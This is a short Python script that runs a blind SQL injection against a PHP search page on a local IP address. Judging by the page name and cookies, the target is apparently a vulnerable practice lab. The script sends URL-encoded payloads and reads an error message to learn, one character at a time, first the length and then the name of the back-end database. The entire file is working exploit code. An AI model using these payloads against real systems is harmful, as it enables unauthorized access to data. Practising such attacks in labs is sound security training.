import requests
import string

cookies = {"PHPSESSID":"q4qvd15jqqbdi85fn80s7favq2", "security_level":"0"}
url = "http://192.168.0.14/sqli_4.php?title="
word_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
database = ""

# find database length
# payload: ' or if((length((select database()))={database_length}),(select 1 Union select 2),0)#
for database_length in range(0,20):
    payload = f"{url}%27+or+if%28%28length%28%28select+database%28%29%29%29%3D{database_length}%29%2C%28select+1+Union+select+2%29%2C0%29%23&action=search"
    response = requests.get(payload, cookies=cookies)
    #print(response.text.find("Incorrect syntax detected!"))
    if (response.text.find("Incorrect syntax detected!") > -1 ):
            print("database length:",database_length)
            break


# find database name
# payload: ' or if((substring((select BINARY database()),{j},1)='{word}'),(select 1 Union select 2),0)#
for j in range(1,database_length+1):
    for word in word_list:
        payload = f"{url}%27+or+if%28%28substring%28%28select+BINARY+database%28%29%29%2C{j}%2C1%29%3D%27{word}%27%29%2C%28select+1+Union+select+2%29%2C0%29%23&action=search"
        #print("URL: ",url)
        response = requests.get(payload, cookies=cookies)
        #print(response.text)
        if (response.text.find("Incorrect syntax detected!") > -1 ):
            print("find",j,"th value:",word)
            database = database + word
print("database name:",database)
